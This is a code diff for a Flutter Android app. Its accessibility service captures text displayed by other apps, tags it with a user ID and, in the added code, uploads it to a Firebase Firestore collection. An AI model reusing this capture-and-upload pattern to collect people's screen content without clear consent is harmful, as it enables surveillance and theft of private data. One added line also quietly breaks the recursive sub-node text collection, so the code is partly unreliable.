@@ -6,7 +6,9 @@ import 'package:flutter_accessibility_service/accessibility_event.dart';
 import 'package:flutter_accessibility_service/constants.dart';
 import 'package:flutter_accessibility_service/flutter_accessibility_service.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:cloud_firestore/cloud_firestore.dart'; // Import Firebase Firestore
 import 'package:tvapp/user_log.dart';
+import 'export.dart'; // Import the export screen
 
 class HorizonLogs extends StatefulWidget {
   const HorizonLogs({super.key, required this.userid, required String ip});
@@ -19,13 +21,12 @@ class HorizonLogs extends StatefulWidget {
 class _HorizonLogsState extends State<HorizonLogs> {
   StreamSubscription<AccessibilityEvent>? _subscription;
   List<Map<String, dynamic>> logBatch = [];
-  bool _isProcessing = false;
+  Map<String, dynamic>? lastLog;
 
   @override
   void initState() {
     super.initState();
     _loadLogs();
-    _startAutoSaveTimer();
   }
 
   void _loadLogs() async {
@@ -41,26 +42,18 @@ class _HorizonLogsState extends State<HorizonLogs> {
   }
 
   void handleAccessibilityStream() {
-    setState(() {
-      _isProcessing = true;
-    });
-
     if (_subscription?.isPaused ?? false) {
       _subscription?.resume();
-      setState(() {
-        _isProcessing = false;
-      });
       return;
     }
-
     _subscription =
         FlutterAccessibilityService.accessStream.listen((event) async {
       final newLog = logImportantDetails(event);
-      if (newLog != null && !isDuplicateLog(newLog)) {
+
+      if (newLog.isNotEmpty) {
         setState(() {
           logBatch.add(newLog);
         });
-        log('New Log Added: ${jsonEncode(newLog)}'); // Log the new entry to the terminal
       }
 
       if (logBatch.length >= 100) {
@@ -68,52 +61,55 @@ class _HorizonLogsState extends State<HorizonLogs> {
         logBatch.clear(); // Clear the batch after saving
       }
     });
-
-    setState(() {
-      _isProcessing = false;
-    });
   }
 
-  Map<String, dynamic>? logImportantDetails(AccessibilityEvent event) {
+  Map<String, dynamic> logImportantDetails(AccessibilityEvent event) {
     final packageName = event.packageName ?? "Unknown Package";
-    final capturedText = event.text?.trim();
-    final timestamp = DateTime.now().toString();
-    final eventType = event.eventType.toString();
-    final mapId = event.mapId ?? "No mapId";
-    final nodeId = event.nodeId ?? "No nodeId";
-    final subNodeText = getSubNodeText(event.subNodes).trim();
+    final capturedText = event.text ?? "";
+    final subNodeText = getSubNodeText(event.subNodes);
 
-    // Do not filter out text fields that have meaningful content
-    if ((capturedText == null || capturedText.isEmpty || capturedText == 'null') &&
-        (subNodeText.isEmpty || subNodeText == 'null')) {
-      return null;
+    // 1. Check for duplicate log
+    if (lastLog != null && _isDuplicateLog(event, capturedText, subNodeText)) {
+      return {}; // Return an empty map to indicate no log should be stored
+    }
+
+    // 2. Check if both subNodeText and capturedText are empty
+    if ((capturedText.isEmpty || capturedText == 'null') &&
+        subNodeText.isEmpty) {
+      return {};
+    }
+
+    // 3. Check if package name is "com.example.tvapp"
+    if (packageName == "com.example.tvapp") {
+      log('scam');
+      return {};
     }
 
     final logEntry = {
       'user_id': widget.userid,
       'package_name': packageName,
       'captured_text': capturedText,
-      'timestamp': timestamp,
-      'event_type': eventType,
-      'map_id': mapId,
-      'node_id': nodeId,
+      'timestamp': DateTime.now().toString(),
+      'event_type': event.eventType.toString(),
+      'map_id': event.mapId ?? "No mapId",
+      'node_id': event.nodeId ?? "No nodeId",
       'sub_node_text': subNodeText,
     };
 
-    log('Processed Log: ${jsonEncode(logEntry)}'); // Log the processed entry to the terminal
-
+    lastLog = logEntry; // Update last log entry
+    log(subNodeText);
     return logEntry;
   }
 
-  bool isDuplicateLog(Map<String, dynamic> newLog) {
-    return logBatch.any((log) =>
-      log['timestamp'] == newLog['timestamp'] &&
-      log['package_name'] == newLog['package_name'] &&
-      log['captured_text'] == newLog['captured_text'] &&
-      log['event_type'] == newLog['event_type'] &&
-      log['map_id'] == newLog['map_id'] &&
-      log['node_id'] == newLog['node_id'] &&
-      log['sub_node_text'] == newLog['sub_node_text']);
+  bool _isDuplicateLog(
+      AccessibilityEvent event, String capturedText, String subNodeText) {
+    return lastLog != null &&
+        lastLog!['package_name'] == event.packageName &&
+        lastLog!['captured_text'] == capturedText &&
+        lastLog!['event_type'] == event.eventType.toString() &&
+        lastLog!['map_id'] == event.mapId &&
+        lastLog!['node_id'] == event.nodeId &&
+        lastLog!['sub_node_text'] == subNodeText;
   }
 
   String getSubNodeText(List<AccessibilityEvent>? subNodes) {
@@ -127,9 +123,8 @@ class _HorizonLogsState extends State<HorizonLogs> {
           subNode.text != 'null') {
         texts.add(subNode.text!);
       }
-      // Recursively get text from nested sub-nodes
       final nestedSubNodeText = getSubNodeText(subNode.subNodes);
-      if (nestedSubNodeText.isNotEmpty) {
+      if (nestedSubNodeText is! String && nestedSubNodeText.isNotEmpty) {
         texts.add(nestedSubNodeText);
       }
     }
@@ -139,18 +134,20 @@ class _HorizonLogsState extends State<HorizonLogs> {
   Future<void> _saveLogs() async {
     SharedPreferences prefs = await SharedPreferences.getInstance();
     List<String> storedLogs = logBatch.map((e) => jsonEncode(e)).toList();
-    await prefs.setStringList('accessibility_logs', storedLogs);
-  }
 
-  void _startAutoSaveTimer() {
-    Timer.periodic(const Duration(minutes: 5), (timer) async {
-      if (logBatch.isNotEmpty) {
-        await _saveLogs();
-        setState(() {
-          logBatch.clear();
+    // Store logs locally
+    await prefs.setStringList('accessibility_logs', storedLogs);
+
+    // Send logs to Firebase Firestore only if subNodeText has changed
+    CollectionReference logsCollection = FirebaseFirestore.instance.collection('accessibility_logs');
+
+    for (var log in logBatch) {
+      if (log['sub_node_text'] != lastLog?['sub_node_text']) {
+        await logsCollection.add(log).catchError((error) {
+          debugPrint('Failed to add log: $error');
         });
       }
-    });
+    }
   }
 
   Future<bool> doAction(AccessibilityEvent node, NodeAction action,
@@ -159,9 +156,27 @@ class _HorizonLogsState extends State<HorizonLogs> {
         node, action, argument);
   }
 
+  void _clearLogs() async {
+    SharedPreferences prefs = await SharedPreferences.getInstance();
+    await prefs
+        .remove('accessibility_logs'); // Clears the logs from SharedPreferences
+    setState(() {
+      logBatch.clear(); // Clears the logs from the local list
+    });
+
+    // Display a Snackbar with a confirmation message
+    ScaffoldMessenger.of(context).showSnackBar(
+      const SnackBar(
+        content: Text('Logs cleared successfully!'),
+        duration: Duration(seconds: 2),
+      ),
+    );
+  }
+
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
+      debugShowCheckedModeBanner: false,
       theme: ThemeData.dark(),
       home: Scaffold(
         appBar: AppBar(
@@ -197,10 +212,8 @@ class _HorizonLogsState extends State<HorizonLogs> {
                     ),
                     const SizedBox(height: 20.0),
                     TextButton(
-                      onPressed: _isProcessing ? null : handleAccessibilityStream,
-                      child: _isProcessing
-                          ? const CircularProgressIndicator()
-                          : const Text("Start Stream"),
+                      onPressed: handleAccessibilityStream,
+                      child: const Text("Start Stream"),
                     ),
                     const SizedBox(height: 20.0),
                     TextButton(
@@ -229,88 +242,118 @@ class _HorizonLogsState extends State<HorizonLogs> {
                 ),
               ),
               const SizedBox(height: 30),
-              ElevatedButton(
-                onPressed: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (context) =>
-                          UserLogsScreen(logs: logBatch, onRefresh: () { 
-                            ElevatedButton(
-  onPressed: () {
-    Navigator.push(
-      context,
-      MaterialPageRoute(
-        builder: (context) =>
-            UserLogsScreen(
-              logs: logBatch, 
-              onRefresh: _loadLogs, // Pass the refresh function
-            ),
-      ),
-    );
-  },
-  style: ElevatedButton.styleFrom(
-    foregroundColor: Colors.white, 
-    backgroundColor: Colors.deepPurpleAccent, 
-    padding: const EdgeInsets.symmetric(
-      vertical: 20.0,
-      horizontal: 40.0,
-    ),
-    shape: RoundedRectangleBorder(
-      borderRadius: BorderRadius.circular(30.0),
-    ),
-    elevation: 10,
-    shadowColor: Colors.purpleAccent,
-  ),
-  child: Row(
-    mainAxisSize: MainAxisSize.min,
-    children: const [
-      Icon(Icons.auto_stories, size: 24.0),
-      SizedBox(width: 10),
-      Text(
-        'View User Logs',
-        style: TextStyle(
-          fontSize: 20.0,
-          fontWeight: FontWeight.bold,
-          letterSpacing: 1.2,
-        ),
-      ),
-    ],
-  ),
-);
-
-                           },), // Use local logs
-                    ),
-                  );
-                },
-                style: ElevatedButton.styleFrom(
-                  foregroundColor: Colors.white, 
-                  backgroundColor: Colors.deepPurpleAccent, 
-                  padding: const EdgeInsets.symmetric(
-                    vertical: 20.0,
-                    horizontal: 40.0,
-                  ),
-                  shape: RoundedRectangleBorder(
-                    borderRadius: BorderRadius.circular(30.0),
-                  ),
-                  elevation: 10,
-                  shadowColor: Colors.purpleAccent,
-                ),
-                child: Row(
-                  mainAxisSize: MainAxisSize.min,
-                  children: const [
-                    Icon(Icons.auto_stories, size: 24.0),
-                    SizedBox(width: 10),
-                    Text(
-                      'View User Logs',
-                      style: TextStyle(
-                        fontSize: 20.0,
-                        fontWeight: FontWeight.bold,
-                        letterSpacing: 1.2,
+              Row(
+                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
+                children: [
+                  ElevatedButton(
+                    onPressed: () {
+                      Navigator.push(
+                        context,
+                        MaterialPageRoute(
+                          builder: (context) =>
+                              UserLogsScreen(logs: logBatch, onRefresh: () {  },), // Use local logs
+                        ),
+                      );
+                    },
+                    style: ElevatedButton.styleFrom(
+                      foregroundColor: Colors.white,
+                      backgroundColor: Colors.deepPurpleAccent,
+                      padding: const EdgeInsets.symmetric(
+                        vertical: 20.0,
+                        horizontal: 40.0,
                       ),
+                      shape: RoundedRectangleBorder(
+                        borderRadius: BorderRadius.circular(30.0),
+                      ),
+                      elevation: 10,
+                      shadowColor: Colors.purpleAccent,
                     ),
-                  ],
-                ),
+                    child: const Row(
+                      mainAxisSize: MainAxisSize.min,
+                      children: [
+                        Icon(Icons.auto_stories, size: 24.0),
+                        SizedBox(width: 10),
+                        Text(
+                          'View User Logs',
+                          style: TextStyle(
+                            fontSize: 20.0,
+                            fontWeight: FontWeight.bold,
+                            letterSpacing: 1.2,
+                          ),
+                        ),
+                      ],
+                    ),
+                  ),
+                  ElevatedButton(
+                    onPressed: _clearLogs, // Calls the _clearLogs function
+                    style: ElevatedButton.styleFrom(
+                      foregroundColor: Colors.white,
+                      backgroundColor: Colors.deepPurpleAccent,
+                      padding: const EdgeInsets.symmetric(
+                        vertical: 20.0,
+                        horizontal: 40.0,
+                      ),
+                      shape: RoundedRectangleBorder(
+                        borderRadius: BorderRadius.circular(30.0),
+                      ),
+                      elevation: 10,
+                      shadowColor: Colors.purpleAccent,
+                    ),
+                    child: const Row(
+                      mainAxisSize: MainAxisSize.min,
+                      children: [
+                        Icon(Icons.delete, size: 24.0),
+                        SizedBox(width: 10),
+                        Text(
+                          'Clear Logs',
+                          style: TextStyle(
+                            fontSize: 20.0,
+                            fontWeight: FontWeight.bold,
+                            letterSpacing: 1.2,
+                          ),
+                        ),
+                      ],
+                    ),
+                  ),
+                  ElevatedButton(
+                    onPressed: () {
+                      Navigator.push(
+                        context,
+                        MaterialPageRoute(
+                          builder: (context) => ExportScreen(), // Navigate to the ExportScreen
+                        ),
+                      );
+                    },
+                    style: ElevatedButton.styleFrom(
+                      foregroundColor: Colors.white,
+                      backgroundColor: Colors.green,
+                      padding: const EdgeInsets.symmetric(
+                        vertical: 20.0,
+                        horizontal: 40.0,
+                      ),
+                      shape: RoundedRectangleBorder(
+                        borderRadius: BorderRadius.circular(30.0),
+                      ),
+                      elevation: 10,
+                      shadowColor: Colors.greenAccent,
+                    ),
+                    child: const Row(
+                      mainAxisSize: MainAxisSize.min,
+                      children: [
+                        Icon(Icons.download, size: 24.0),
+                        SizedBox(width: 10),
+                        Text(
+                          'Export Data',
+                          style: TextStyle(
+                            fontSize: 20.0,
+                            fontWeight: FontWeight.bold,
+                            letterSpacing: 1.2,
+                          ),
+                        ),
+                      ],
+                    ),
+                  ),
+                ],
               ),
             ],
           ),
